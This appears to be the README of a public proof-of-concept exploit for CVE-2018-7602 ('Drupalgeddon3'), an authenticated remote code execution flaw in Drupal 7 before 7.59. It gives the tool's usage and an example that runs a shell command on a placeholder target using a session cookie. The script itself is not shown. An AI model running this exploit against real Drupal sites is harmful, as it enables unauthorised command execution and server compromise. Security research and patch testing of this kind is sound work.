### SA-CORE-2018-004
Drupalgeddon3 SA-CORE-2018-004 POC

CVE-2018-7602 - Drupal 7.x RCE

Drupal < 7.59 authenticated RCE

Requirements
python requests (pip install requests)

### Usage
`python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]`

### Example
`python drupalgeddon3.py http://target/drupal/ 'SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0' 6 'uname -a'`

<img src='https://raw.githubusercontent.com/oways/SA-CORE-2018-004/master/example.png'/>
